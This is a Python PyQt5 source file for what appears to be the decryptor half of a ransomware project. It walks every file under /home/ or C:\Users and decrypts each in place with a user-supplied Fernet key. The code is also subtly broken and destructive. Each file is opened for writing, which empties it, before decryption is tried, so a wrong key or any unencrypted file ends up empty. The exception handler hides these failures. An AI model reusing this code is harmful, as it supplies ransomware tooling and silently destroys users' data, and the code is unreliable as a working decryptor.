import sys, os, platform
from cryptography.fernet import Fernet
from PyQt5 import QtWidgets
from PyQt5.QtWidgets import QApplication, QMessageBox
from DecryptMain import Ui_MainWindow


class myApp(QtWidgets.QMainWindow):
    def __init__(self):
        super(myApp, self).__init__()

        self.ui = Ui_MainWindow()
        self.ui.setupUi(self)

        self.ui.btnDecrypt.clicked.connect(self.getSystemInformation)

    def getSystemInformation(self):
        system = platform.uname()

        if system.system == "Linux":  
            self.linuxSysEncrypted() 
        elif system.system == "Windows":
            self.windowsSysEncrypted()
        else:
            self.showDialog("Error!", "Operating system not supported.")    

    def decryptFiles(self, location):
        key = (self.ui.decrypt_key.text()).encode()
        fer = Fernet(key)

        try:
            with open(location, "rb") as readFile:
                readFile = readFile.read() 
                                
            with open(location, "wb") as writeFile:
                decrypted = fer.decrypt(readFile)
                writeFile.write(decrypted)
        except Exception:
            self.showDialog("Error!", "Something went wrong.")  

    def linuxSysEncrypted(self):
        os.getcwd()
        os.chdir("/home/")
        for dirpath, dirname, filenames in os.walk(os.getcwd()):
            if filenames:
                for _file in filenames:
                    location = dirpath + "/" + _file
                    self.decryptFiles(location=location)
        self.showDialog("Warning!", "Password removed.")

    def windowsSysEncrypted(self):
        os.getcwd()
        os.chdir('C:\\')
             
        for dirpath, dirname, filenames in os.walk(os.getcwd() + "/Users"):
            if filenames:
                for _file in filenames:                   
                    location = dirpath + "\\" + _file 
                    self.decryptFiles(location=location)
        self.showDialog("Warning!", "Password removed.")

    def showDialog(self, title, messages):
        return QMessageBox.information(self, title, messages)


if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    win = myApp()

    win.show()
    sys.exit(app.exec_())